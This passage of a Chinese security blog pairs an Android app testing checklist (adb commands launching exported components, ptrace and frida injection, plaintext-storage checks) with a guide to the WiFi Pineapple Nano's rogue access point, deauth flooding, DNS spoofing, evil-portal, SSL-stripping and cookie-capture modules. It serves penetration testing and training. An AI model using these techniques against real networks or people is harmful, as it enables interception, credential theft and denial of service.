<h3 id="BroadcastReceiver拒绝服务"><a href="#BroadcastReceiver拒绝服务" class="headerlink" title="BroadcastReceiver拒绝服务"></a>BroadcastReceiver拒绝服务</h3><p>查看AndroidManifest.xml是否存在Receiver导出<br>利用adb命令启动被导出的Receiver</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb shell am broadcast –n pachage_name&#x2F;receiver_name</span><br></pre></td></tr></table></figure>



<h3 id="service拒绝服务"><a href="#service拒绝服务" class="headerlink" title="service拒绝服务"></a>service拒绝服务</h3><p>查看AndroidManifest.xml是否存在Service导出<br>利用adb命令启动被导出的Service</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb shell am start service –n pachage_name&#x2F;service_name</span><br></pre></td></tr></table></figure>



<h3 id="Provider目录遍历"><a href="#Provider目录遍历" class="headerlink" title="Provider目录遍历"></a>Provider目录遍历</h3><p>查看Provider是否导出<br>查看反编译代码,检查OpenFile函数中是否包含路径校验逻辑</p>
<h3 id="Ptrace注入"><a href="#Ptrace注入" class="headerlink" title="Ptrace注入"></a>Ptrace注入</h3><h4 id="检测方法一："><a href="#检测方法一：" class="headerlink" title="检测方法一："></a>检测方法一：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">推送inject和libpayload.so到手机&#x2F;data&#x2F;local&#x2F;tmp中</span><br><span class="line">为inject添加执行权限</span><br><span class="line">执行注入命令inject 进程名 &#x2F;data&#x2F;local&#x2F;tmp&#x2F;libpayload.so 任意字符串</span><br><span class="line">adb logcat -s 360Inject抓取日志分析是否注入成功</span><br></pre></td></tr></table></figure>

<h4 id="检测方法二："><a href="#检测方法二：" class="headerlink" title="检测方法二："></a>检测方法二：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">frida-trace -U -i &quot;recv*&quot;  -f 包名</span><br><span class="line">cat &#x2F;proc&#x2F;PID&#x2F;maps |grep frida</span><br></pre></td></tr></table></figure>

<h3 id="SharedPreferences明文保存敏感信息"><a href="#SharedPreferences明文保存敏感信息" class="headerlink" title="SharedPreferences明文保存敏感信息"></a>SharedPreferences明文保存敏感信息</h3><p>跳转到app的数据目录</p>
<p>查看所有xml文件,检测是否包含敏感数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb shell</span><br><span class="line">cd &#x2F;data&#x2F;data&#x2F;package_name&#x2F;hared_prefs&#x2F;</span><br></pre></td></tr></table></figure>

<p>查看所有xml文件,检测是否包含敏感数据</p>
<h3 id="SQLite明文保存敏感信息"><a href="#SQLite明文保存敏感信息" class="headerlink" title="SQLite明文保存敏感信息"></a>SQLite明文保存敏感信息</h3><p>跳转到app的database目录</p>
<p>查看所有db文件,检测是否包含敏感数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb shell</span><br><span class="line">cd &#x2F;data&#x2F;data&#x2F;package_name&#x2F;database&#x2F;</span><br></pre></td></tr></table></figure>

<p>查看所有db文件,检测是否包含敏感数据</p>
<h3 id="log敏感信息检测"><a href="#log敏感信息检测" class="headerlink" title="log敏感信息检测"></a>log敏感信息检测</h3><p>使用logcat命令抓取log</p>
<p>分析日志中是否包含敏感信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell adb logcat &gt; logfile.log</span><br></pre></td></tr></table></figure>

<p>分析日志中是否包含敏感信息</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>adb</tag>
      </tags>
  </entry>
  <entry>
    <title>WIFI渗透利器PineApple-Nano</title>
    <url>/2021/01/07/IOT/WIFI%E6%B8%97%E9%80%8F%E5%88%A9%E5%99%A8PineApple-Nano/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote>
<p>The WiFi Pineapple 是由国外无线安全审计公司Hak5开发并售卖的一款无线安全测试神器（俗称大菠萝），从2008年起目前已经发布到第六代产品。当前的主打产品是The WiFi Pineapple NANO 和WiFI Pineapple TETRA（支持5GHz频段）</p>
</blockquote>
<a id="more"></a>

<h2 id="产品规格"><a href="#产品规格" class="headerlink" title="产品规格"></a>产品规格</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CPU：400 MHz MIPS Atheros AR9331 SoC</span><br><span class="line"></span><br><span class="line">内存：64 MB DDR2 RAM</span><br><span class="line"></span><br><span class="line">磁盘：16 MB ROM + Micro SD（6G）</span><br><span class="line"></span><br><span class="line">无线：Atheros AR9331（wlan0）+ Atheros AR9271（wlan1），均为IEEE 802.11 b &#x2F; g &#x2F; n</span><br><span class="line"></span><br><span class="line">端口：（2）RP-SMA天线，USB网卡（ASIX AX88772A）</span><br><span class="line"></span><br><span class="line">USB 2.0主机，Micro SD读卡器</span><br><span class="line"></span><br><span class="line">电源：USB 5V 1.5A. 包括 Y型USB电源线</span><br><span class="line"></span><br><span class="line">可配置状态指示灯LED</span><br><span class="line"></span><br><span class="line">可配置的重置按钮</span><br></pre></td></tr></table></figure>

<h1 id="使用背景"><a href="#使用背景" class="headerlink" title="使用背景"></a>使用背景</h1><h2 id="1-安全研究"><a href="#1-安全研究" class="headerlink" title="1.安全研究"></a>1.安全研究</h2><p>对于研究方向为wifi安全的小伙伴们，可以使用这款“外设”作为入门和进阶的部分，能够让我们了解一些常见的wifi安全问题、原理和攻击手段，进一步的可以分析这些利用工具的原理，实现方法，组合攻击手段</p>
<h2 id="2-安全演示"><a href="#2-安全演示" class="headerlink" title="2.安全演示"></a>2.安全演示</h2><p>如果你是安服的小伙伴，给客户演示的时候不要总是带着自建靶场，给领导搞个SQL注入，永恒之蓝，过时了！就算你配合Cobalt Strike来个主机上线，也顶多是视觉上的刺激。你带个wifipineapple，现场来个中间人，搞个绵羊墙，抓个密码，岂不美哉？</p>
<h1 id="管理"><a href="#管理" class="headerlink" title="管理"></a>管理</h1><p>Web管理端地址：<a href="http://172.16.42.1:1471">http://172.16.42.1:1471</a></p>
<h1 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h1><ol>
<li>用作 Wi-Fi 中间人攻击测试平台</li>
<li>一整套的针对 AP 的渗透测试套件</li>
<li>基于 WEB 应用的管理界面</li>
<li>基于嵌入式 linux 系统</li>
<li>不定时的各种软件更新，可以自定义模块、payload</li>
</ol>
<h1 id="管理页面简介"><a href="#管理页面简介" class="headerlink" title="管理页面简介"></a>管理页面简介</h1><h2 id="1-Dashboard仪表盘"><a href="#1-Dashboard仪表盘" class="headerlink" title="1.Dashboard仪表盘"></a>1.Dashboard仪表盘</h2><p>仪表盘上显示了一些状态、统计信息、通知和公告的概览视图，包括：</p>
<p>CPU 使用率、设备运行时间、客户端连接数量</p>
<p>Landing Page 浏览状态，公告</p>
<p>Bulletins从wifipineapple.com获取的最新项目信息</p>
<h2 id="2-Recon侦察"><a href="#2-Recon侦察" class="headerlink" title="2.Recon侦察"></a>2.Recon侦察</h2><p>Recon模块采用被动式扫描方式，扫描过程会自动将网卡设置为监听模式，监听周围不同信道（客户端）发出的各种数据包。能够扫描出SSID、MAC地址、加密方式、是否启用了WPS功能、信道及信号强度等信息。甚至还能扫描出当前未连接任何AP的客户端</p>
<p>从下拉列表为扫描的持续时间，增加扫描时间可以在每个信道上看到更多潜在的流量，选中“Continuous”框将启用正在进行的扫描。每隔一段时间进行持续扫描，并更新扫描结果列表，直到扫描停止</p>
<p>扫描结果将显示在表格视图中</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210107231050591.png" alt="image-20210107231050591"></p>
<p>未关联的客户端仅显示 MAC 地址。这些客户端具有活动无线电，但不与接入点关联</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210107231132085.png" alt="image-20210107231132085"></p>
<p>单击SSID和MAC地址旁的下拉菜单，会出现如下两张图的菜单，用于 PineAP 模块的 Filter(过滤) 和 Tracking(追踪) 功能，以及进行 Deauth(取消认证洪水) 攻击中发送取消身份验证帧的倍数参数</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210107231253023.png" alt="image-20210107231253023" style="zoom: 33%;">

<p>如果使用 Recon 模块进行扫描将会断开已有的连接</p>
<h2 id="3-Client客户端"><a href="#3-Client客户端" class="headerlink" title="3.Client客户端"></a>3.Client客户端</h2><p>如果在 PineAP 中勾选了 Allow Associations(允许关联)，WiFi Pineapple将允许客户端进行连接</p>
<p>已连接的客户端将在“ Clients ”视图中列出它们各自的MAC地址，IP地址，它们已连接的 SSID （如果在PineAP中启用了Log Probes(日志探测) 功能）和主机名</p>
<p>Kick按钮可以从Wi-Fi Pineapple网络中删除客户端</p>
<p>MAC地址和SSID旁边的下拉菜单按钮用于 PineAP 模块的 Filter 和 Tracking 功能</p>
<p>Refresh按钮可以刷新Clients表格视图</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210107231838630.png" alt="image-20210107231838630"></p>
<h2 id="4-Tracking"><a href="#4-Tracking" class="headerlink" title="4.Tracking"></a>4.Tracking</h2><p>跟踪功能将按MAC地址连续扫描指定的客户端，并执行可自定义的跟踪脚本</p>
<p>此功能需要启用 PineAP 的 Log Probes 和 Log Associations 中的至少一个选项</p>
<p>可以手动添加客户端，也可以在 Clients 或 Recon 视图中关联的MAC地址使用 PineAP Tracking Add MAC 按钮添加 Mac 地址到此模块中</p>
<p>当客户端被识别时，将会执行自定义脚本</p>
<h2 id="5-Filters"><a href="#5-Filters" class="headerlink" title="5.Filters"></a>5.Filters</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210107233004096.png" alt="image-20210107233004096"></p>
<p>可以通过客户端MAC地址或SSID来执行过滤。支持“Deny”和“Allow”模式，可以使用Swith按钮进行切换</p>
<h3 id="Client-Filtering-客户端过滤"><a href="#Client-Filtering-客户端过滤" class="headerlink" title="Client Filtering 客户端过滤"></a>Client Filtering 客户端过滤</h3><p>在Deny Mode下，客户端过滤器中列出的具有MAC地址的客户端将无法连接到WiFi Pineapple</p>
<p>在 Allow Mode下，只有客户端过滤器中列出的具有MAC地址的客户端才能连接</p>
<p>进行WI-FI安全测试时，最好使用“Allow Mode”以确保仅针对参与范围内的客户端</p>
<h3 id="SSID-Filtering-SSID过滤"><a href="#SSID-Filtering-SSID过滤" class="headerlink" title="SSID Filtering SSID过滤"></a>SSID Filtering SSID过滤</h3><p>在Deny Mode下，如果客户端尝试连接到过滤器中列出的SSID，则客户端将无法与WiFi Pineapple关联</p>
<p>在 Allow Mode下，如果过滤器中列出了他们尝试连接的SSID，则客户端只能与WiFi Pineapple关联</p>
<p>SSID可以从与Recon中各自列表相关联的菜单按钮添加到过滤器中，也可以手动添加或删除过滤器中的条目</p>
<h2 id="6-PineAP-Pine接入点"><a href="#6-PineAP-Pine接入点" class="headerlink" title="6.PineAP Pine接入点"></a>6.PineAP Pine接入点</h2><p>PineAP是通过伪造的Probe Response响应包来响应周围的客户端（可能是笔记本、手机、pad等等），让客户端以为周围存在着曾经成功连接过的无线AP，而用来欺骗客户端进行连接我们的Pineapple Nano设备</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210107235456065.png" alt="image-20210107235456065" style="zoom: 33%;">

<h3 id="Allow-Associations-允许关联"><a href="#Allow-Associations-允许关联" class="headerlink" title="Allow Associations 允许关联"></a>Allow Associations 允许关联</h3><p>此项被勾选时，客户端可以通过任何请求的 SSID连接到Pineapple</p>
<p>禁用时，客户端将不允许被连接。相当于以前的 karma</p>
<h3 id="PineAP-Daemon-PineAP-守护进程"><a href="#PineAP-Daemon-PineAP-守护进程" class="headerlink" title="PineAP Daemon PineAP 守护进程"></a>PineAP Daemon PineAP 守护进程</h3><p>这个进程必须开启</p>
<p>可以使用 Beacon 响应，捕获 SSIDs 到池里，以及对SSID进行广播</p>
<p>这个设置会作用于 wlan1 ，并且 wlan1 不能用于 Client 模式去桥接外网</p>
<h3 id="Log-PineAP-Events-日志探测"><a href="#Log-PineAP-Events-日志探测" class="headerlink" title="Log PineAP Events 日志探测"></a>Log PineAP Events 日志探测</h3><p>开启后，将记录客户端的探针请求。可以从 Logging 模块里看查看分析</p>
<h3 id="Beacon-Response-响应"><a href="#Beacon-Response-响应" class="headerlink" title="Beacon Response 响应"></a>Beacon Response 响应</h3><p>开启之后，目标 beacons 将会发送给客户端设备，用来响应客户端的 SSID 探针请求</p>
<p>这些 beacons 将不会被广播，而是指定发送给发送了探针请求的客户端设备。这可以防止beacon 被其他设备看见。如果 Allow Associations 启用并且有客户端连接，目标 beacon 响应将持续发送给客户端设备一段时间</p>
<p>Beacon 响应将会使用源 mac 地址设置，并且也会与广播 SSID池特性共享</p>
<p>Beacon 响应间隔将决定发射的频率</p>
<h3 id="Capture-SSIDs-to-Pool"><a href="#Capture-SSIDs-to-Pool" class="headerlink" title="Capture SSIDs to Pool"></a>Capture SSIDs to Pool</h3><p>使能之后，将会把捕捉到的探针请求里的 SSID 保存到 SSID 池子里。这</p>
<p>种被动的特点将有利于广播 SSID 池特性。SSID 池也可以被手动来管理</p>
<h3 id="Broadcast-SSID-Pool"><a href="#Broadcast-SSID-Pool" class="headerlink" title="Broadcast SSID Pool"></a>Broadcast SSID Pool</h3><p>使能之后，SSID 池将会按照设定的时间间隔以及源地址、目标地址来广播</p>
<p>beacon。就是以前的 Dogma</p>
<h3 id="Beacon-Response-Interval"><a href="#Beacon-Response-Interval" class="headerlink" title="Beacon Response Interval"></a>Beacon Response Interval</h3><p>指定广播 SSID 的时间间隔。间隔越小，对 CPU 的占用就越高。</p>
<h3 id="Beacon-Response-Interval-1"><a href="#Beacon-Response-Interval-1" class="headerlink" title="Beacon Response Interval"></a>Beacon Response Interval</h3><p>指定 beacon 响应的时间间隔。间隔越小，对 CPU 的占用就越高</p>
<h3 id="Source-MAC"><a href="#Source-MAC" class="headerlink" title="Source MAC"></a>Source MAC</h3><p>默认情况下，是菠萝 wlan0 的 mac 地址。这是菠萝的 ap 的热点。wlan0 的 mac 地</p>
<p>址也可以在 Networking 里改变。如果需要的话，这个 mac 地址可以被设定为一个次要的菠萝。</p>
<h3 id="Target-MAC"><a href="#Target-MAC" class="headerlink" title="Target MAC"></a>Target MAC</h3><p>默认情况下，这是广播 mac 地址 FF:FF:FF:FF:FF:FF。用于广播帧数据将会被附近的</p>
<p>客户端看到。设置为客户端的 mac 地址将把 PineAP 的特性用于单一的设备。类似 beacon 响应，只</p>
<p>有池子里的 SSID 广播会被目标客户端看到。当和过滤器一起工作时，这个特性将更精确的定位到目</p>
<p>标设备。</p>
<h3 id="SSID-Pool"><a href="#SSID-Pool" class="headerlink" title="SSID Pool"></a><strong>SSID Pool</strong></h3><p>当Capture SSID Pool 被使能后，会自动记录。也可以手动添加。点击列表里的 SSID，</p>
<p>也可以执行删除和清除操作</p>
<h2 id="7-Tracking"><a href="#7-Tracking" class="headerlink" title="7.Tracking"></a>7.Tracking</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210108003751612.png" alt="image-20210108003751612"></p>
<p>跟踪功能将按MAC地址连续扫描指定的客户端，并执行可自定义的跟踪脚本</p>
<p>此功能需要启用 PineAP 的 Log Probes 和 Log Associations 中的至少一个选项</p>
<p>可以手动添加客户端，也可以在 Clients 或 Recon 视图中关联的MAC地址使用 PineAP Tracking Add MAC 按钮添加 Mac 地址到此模块中</p>
<p>当客户端被识别时，将会执行自定义脚本</p>
<h2 id="8-Logging"><a href="#8-Logging" class="headerlink" title="8.Logging"></a>8.Logging</h2><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210108004435046.png" alt="image-20210108004435046" style="zoom:50%;">

<p>Logging模块共记录了 PineAP Log、System Log、Dmesg、Reporting Log四种日志</p>
<h3 id="PineAP-Log"><a href="#PineAP-Log" class="headerlink" title="PineAP Log"></a>PineAP Log</h3><p>如果启用了Log Probes 和 Log Associations其中的一个或全部，则按时间顺序显示PineAP事件。每个事件都包含时间戳，事件类型（探测请求或关联），客户端设备的MAC地址以及设备探测或关联的SSID</p>
<p>可以对结果进行过滤，在按下”Apply Filter”之前，过滤器不会生效，默认情况下，PineAP日志位于/tmp中，重启不会保存</p>
<h3 id="System-Log"><a href="#System-Log" class="headerlink" title="System Log"></a>System Log</h3><p>系统日志</p>
<h3 id="Dmesg"><a href="#Dmesg" class="headerlink" title="Dmesg"></a>Dmesg</h3><p>设备故障的诊断，硬件连接断开等信息</p>
<h3 id="Reporting-Log"><a href="#Reporting-Log" class="headerlink" title="Reporting Log"></a>Reporting Log</h3><p>生成报告日志</p>
<h2 id="9-Reporting"><a href="#9-Reporting" class="headerlink" title="9.Reporting"></a>9.Reporting</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210108004746791.png" alt="image-20210108004746791"></p>
<p>此功能能够以指定的间隔生成报告。报告可以通过电子邮件发送，也可以本地保存在SD卡上</p>
<p>报告内容可选，包括PineAP日志（可以在生成报告后删除），PineAP Site Survey（可指定扫描时间）PineAP 探测和跟踪客户端报告。</p>
<h2 id="10-Networking网络"><a href="#10-Networking网络" class="headerlink" title="10.Networking网络"></a>10.Networking网络</h2><p>在 Networking 模块中，可以更改路由，接入点，MAC地址，主机名，并使用WiFi客户端模式连接到接入点</p>
<h3 id="Route-路由"><a href="#Route-路由" class="headerlink" title="Route 路由"></a>Route 路由</h3><p>显示内核IP路由表，可以针对所选接口进行修改，默认网关为172.16.42.42</p>
<p>使用WiFi Pineapple Connector Android应用程序时，IP路由将自动更新以使用usb0作为默认网关</p>
<p>下拉菜单可以重启DNS服务</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210108004844930.png" alt="image-20210108004844930"></p>
<h3 id="Access-Points-接入点"><a href="#Access-Points-接入点" class="headerlink" title="Access Points 接入点"></a>Access Points 接入点</h3><p>可以配置WiFi Pineapple主要开放接入点和管理接入点。开放和管理接入点共享相同的信道</p>
<p>可以隐藏开放接入点，并且可以禁用管理接入点</p>
<h3 id="WiFi-Client-Mode-WI-FI客户端模式"><a href="#WiFi-Client-Mode-WI-FI客户端模式" class="headerlink" title="WiFi Client Mode WI-FI客户端模式"></a>WiFi Client Mode WI-FI客户端模式</h3><p>能够将WiFi Pineapple连接到另一个无线接入点，以进行Internet或本地网络访问</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210108005043399.png" alt="image-20210108005043399" style="zoom:50%;">

<h2 id="11-Configuration"><a href="#11-Configuration" class="headerlink" title="11.Configuration"></a>11.Configuration</h2><h3 id="Landing-Page"><a href="#Landing-Page" class="headerlink" title="Landing Page"></a>Landing Page</h3><p>启动后，客户端全部链接将会被强制导向到此页面，页面访问的统计信息将会显示在 Dashboard 上</p>
<p>页面可以是 PHP 或 HTML 的</p>
<p>只有WiFi Pineapple具有Internet连接时，才会显示此页面</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210108005535734.png" alt="image-20210108005535734" style="zoom: 33%;">

<h2 id="12-Advanced"><a href="#12-Advanced" class="headerlink" title="12.Advanced"></a>12.Advanced</h2><p>此页面显示一些系统资源信息，USB 设备，文件系统列表，CSS 和固件升级。</p>
<h2 id="13-Help"><a href="#13-Help" class="headerlink" title="13.Help"></a>13.Help</h2><p>可以查看对应模块的帮助和使用介绍</p>
<h1 id="常用模块"><a href="#常用模块" class="headerlink" title="常用模块"></a>常用模块</h1><h2 id="模块总结"><a href="#模块总结" class="headerlink" title="模块总结"></a>模块总结</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DWall 绵羊墙，可以显示 HTTP URLs, Cookies, POST DATA，可实时展示客户端的</span><br><span class="line">图片</span><br><span class="line">Deauth 对菠萝附近接入到其他 AP 的客户端进行认证攻击</span><br><span class="line">EvilPortal 一个邪恶的强制网络门户</span><br><span class="line">SSLsplit 使用 SSLsplit 执行中间人攻击</span><br><span class="line">Status 显示设备的状态信息</span><br><span class="line">ettercap 使用 ettercap 执行中间人攻击</span><br><span class="line">NMAP GUI 的安全扫描器 NMAP</span><br><span class="line">SiteSurvey 无线现场调查</span><br><span class="line">urlsnarf 使用 urlsnarf 输出 客户端所有的 http URL 请求</span><br><span class="line">Occupineapple 广播用于欺骗的 WiFi SSID 热点</span><br><span class="line">tcpdump 使用 tcpdump 抓取 客户端数据包</span><br><span class="line">DNSspoof dns 欺骗</span><br><span class="line">SignalStrength 显示附近 ap 的信号强度</span><br><span class="line">RandomRoll 恶搞连接到菠萝的客户端</span><br><span class="line">wps 使用 Reaver, Bully and Pixiewps 进行 wps 攻击</span><br><span class="line">ConnectedClients 显示当前连接的客户端设备的信息</span><br><span class="line">OnlineHashCrack 提交 Hash 和 WPA Handshake 包 到 www.onlinehashcrack.com</span><br><span class="line">PortalAuth 强制门户克隆 和 流量分发</span><br><span class="line">get 通过客户端的浏览器插件来识别客户端的信息</span><br><span class="line">p0f 使用 p0f 被动流量指纹</span><br><span class="line">Papers 一个 TLS&#x2F; SSL 和 SSH 证书生成管理插件</span><br><span class="line">LogManager 管理所有模块的 log 信息</span><br><span class="line">Cabinet web 页面的文件管理器</span><br><span class="line">Responder LLMNR，NBT-NS 和 MDNS 投毒内置的 HTTP，SMB，MSSQL，FTP 和 LDAP</span><br><span class="line">流氓认证服务器</span><br><span class="line">DNSMasqSpoof 使用 dnsmasq 来进行 dns 欺骗</span><br><span class="line">ngrep 使用 ngrep 来匹配查找数据包</span><br><span class="line">autossh autossh 插件，可用于远程 ssh 来管理菠萝</span><br><span class="line">dump1090 使用 RTS-SDR 获取轨道飞行器的 ADS-B 信标</span><br><span class="line">KeyManager ssh 密匙管理器</span><br><span class="line">CursedScreech 安全控制容易被入侵的系统</span><br><span class="line">base64encdec Base64 编码和解码</span><br><span class="line">ModuleMaker module 生成工具</span><br><span class="line">APITokens 在 wifipineapple 上创建和删除 API 令牌</span><br><span class="line">Commander 通过 IRC 控制菠萝</span><br><span class="line">HackRF HackRF 插件</span><br></pre></td></tr></table></figure>



<h2 id="DWall绵羊墙"><a href="#DWall绵羊墙" class="headerlink" title="DWall绵羊墙"></a>DWall绵羊墙</h2><p>DWall 是一款可以实时抓取 http 数据的插件，并且可以实时展示在web页面上</p>
<p>Enable开启模块，Start Listening 开始监听</p>
<p>所有连到 Pineapple 客户端的http连接都会被抓到</p>
<p>页面显示了客户端、URL、Cookies、数据内容，以及图片</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120155024676.png" alt="image-20210120155024676"></p>
<h2 id="Deauth"><a href="#Deauth" class="headerlink" title="Deauth"></a>Deauth</h2><p>De-authenticationFlood Attack，全称为取消身份验证洪水攻击或验证阻断洪水攻击，通常被简称为Deauth攻击，是无线网络拒绝服务攻击的一种形式。它旨在通过欺骗从AP到客户端单播地址的取消身份验证帧来将客户端转为未关联／未认证的状态</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120155608984.png" alt="image-20210120155608984"></p>
<p>normal模式下，选中网卡，点击 Start 后就开始攻击攻击过程中同网段内的网络认证（由于NANO不支持5G，所以攻击仅支持2.4G）均会失败，无法认证并连接</p>
<p>要针对某个WI-FI攻击，可以在Editor中选中网卡，扫描WI-FI，并Add to Blacklist（添加到黑名单），在Mode中也选择blacklist，输入Channels，信道可以去SiteSurvey中查看</p>
<h2 id="DNS-DNSMasq-Spoof"><a href="#DNS-DNSMasq-Spoof" class="headerlink" title="DNS/DNSMasq Spoof"></a>DNS/DNSMasq Spoof</h2><p>这个插件会启动 DNSMasq 服务，对客户端访问的域名进行重定向</p>
<p>在Hosts处填写要重定向的域名，写法与其他 Hosts 文件一致</p>
<p>此处可以填写内网配置好的钓鱼服务器，也可以指到Pineapple，并在上面搭建服务</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120162539271.png" alt="image-20210120162539271"></p>
<h2 id="Urlsnarf-URL捕获"><a href="#Urlsnarf-URL捕获" class="headerlink" title="Urlsnarf URL捕获"></a>Urlsnarf URL捕获</h2><p>选定网口后点击 Start ，模块将会捕获全部的HTTP流量，GET及POST的数据均会显示</p>
<p>显示格式为web访问日志类型</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120163418442.png" alt="image-20210120163418442"></p>
<h2 id="Evil-Portal"><a href="#Evil-Portal" class="headerlink" title="Evil Portal"></a>Evil Portal</h2><p>模块主要由以下几个部分组成：</p>
<p>Controls（控制）：启用模块和设置自动启动；</p>
<p>Word Bench（创建工作目录）：包含门户页面的php文件等；</p>
<p>White List（白名单）：不需要通过门户认证页面跳转的IP地址列表；</p>
<p>Authorized Clients（认证客户端）：当前通过门户页面认证跳转过的IP地址列表；</p>
<p>Live Preview（预览）：预览恶意门户页面。</p>
<p>Evil Portal模块和自带的Landing Page功能很像，区别在于Landing Page仅能够提供一个强制跳转显示页面的效果，不具有认证、白名单以及更自由化的门户页面自定义功能。Evil Portal能够实现像现在的商业WiFi接入访问一样，提供一个由我们自定义的认证页面，引导客户端用户完成认证及跳转功能</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120170837202.png" alt="image-20210120170837202"></p>
<h2 id="Tcpdump"><a href="#Tcpdump" class="headerlink" title="Tcpdump"></a>Tcpdump</h2><p>tcpdump可以将网络中传送的数据包完全截获下来提供分析。它支持针对网络层、协议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来去掉无用的信息，是一款非常高级的网络数据分析工具</p>
<p>与Pineapple上很多其他的模块一样，提供的可供点选的web管理界面</p>
<p>Options提供了基本的选项模块</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120174258901.png" alt="image-20210120174258901"></p>
<p>在下方选中或勾选的参数将会被格式化到 Command 处</p>
<p>Interface 为需要监听的端口</p>
<p>Verbose 对应 -v 选项，代表输出报文信息的详细程度</p>
<p>Resolve 对应 -n 选项，不将主机名转换为IP地址，以及不进行端口名称的转换</p>
<p>Timestamp 对应 -t 选项，指定是否输出时间戳或时间戳格式</p>
<p>Don’t print domain name qualification of host names:对应 -N 选项，不输出主机名中的域名部分。例如，’wiki.ver007.org’只输出’wiki’</p>
<p>Show the packet’s contents in both hex and ASCII:对应 -X 选项，在解析和打印时，除了打印每个包的报头之外，还要用十六进制和ASCII打印每个包的数据（通常用于分析一种协议）</p>
<p>Print absolute sequence numbers：对应 -S 选项，将tcp的序列号以绝对值形式输出</p>
<p>Get the ethernet header as well：对应 -e 选项，在输出行打印出数据链路层的头部信息</p>
<p>Show less protocol information：对应 -q 选项，快速输出。只输出较少的协议信息</p>
<p>Monitor mode：对应 -I 选项，使标准输出变为缓冲行形式，可以把数据导出到文件</p>
<p>Filter提供了一些过滤规则，我们可以利用Filter编写过滤表达式，用来匹配得到我们想要的结果，在点选参数之后，手动输入参数值，并继续点击下一个参数，同样的，如果你熟悉tcpdump的话，可以进行手工填写，跟wireshark什么的过滤语法道理都类似</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120175018888.png" alt="image-20210120175018888"></p>
<p>Output为系统回显，History则可以查看和管理抓住的完整tcp数据包</p>
<p>在此处可以将捕获的包下载，得到一个pcap文件，可以在wireshark、networkminer、科来等其他工具中</p>
<p>具体的使用方法就根据需求不同定制，需要熟悉过滤表达式的编写</p>
<p>需要注意的是，tcpdump只能抓取流经本机的数据包，因此确保有 Client 连接上网</p>
<p>由于页面仅提供部分命令，如果想要达到与命令行完全一样的效果，可以SSH连接到Pineapple直接运行tcpdump.sh，路径在/pineapple/modules/tcpdump/scripts</p>
<h2 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h2><p>大名鼎鼎的 Meterpreter，配置主机端口后能够接收会话</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120190521423.png" alt="image-20210120190521423"></p>
<h2 id="Ettercap"><a href="#Ettercap" class="headerlink" title="Ettercap"></a>Ettercap</h2><p>调用 ettercap 这款工具进行中间人欺骗，将参数转换为web页面，并将输出返回到页面上</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120192438752.png" alt="image-20210120192438752"></p>
<h2 id="SSLsplit"><a href="#SSLsplit" class="headerlink" title="SSLsplit"></a>SSLsplit</h2><p>SLsplit可以作为中间人监听 SSL 信息及 HTTP 信息。SSL 实现代理的同时要与服务器建立连接，同时伪造证书与客户端建立连接，即双连接，依据获取的 Client 信息再与服务器通信，从而实现明文数据监听</p>
<p>Configuration无需改变，使用默认即可</p>
<p>在客户端使用HTTPS进行通讯时，将会由SSLsplit作为中间代理</p>
<p>SLLsplit的实现需要配合其他欺骗手段，如果有Clients连接到Pineapple，那么就直接可以进行攻击，如果要攻击的目标在同一网段内，则需要将目标流量定向到此模块的监听端口，通常配合 ettercap等欺骗软件</p>
<p>如果网站具有HSTS（HTTP Strict Transport Security）,网站将不能正常显示，也就无法攻击</p>
<h2 id="namp"><a href="#namp" class="headerlink" title="namp"></a>namp</h2><p>Options（选项）与图形化的Nmap页面相似，输入目标，在 Profile 中选择一些预置的规则</p>
<p>![image-20210120192348639](../../../../../../Library/Application Support/typora-user-images/image-20210120192348639.png)</p>
<h2 id="RandomRoll"><a href="#RandomRoll" class="headerlink" title="RandomRoll"></a>RandomRoll</h2><p>这个模块是一个略微搞怪的模块，开启模块后，将会把全部 http 连接进行重定向到内置的黑页中</p>
<p>就是下面勾选的这些 rolls，每个对应一个黑页，随机选择出现</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120192115418.png" alt="image-20210120192115418"></p>
<p>开启后，客户端会随机出现选中的黑页</p>
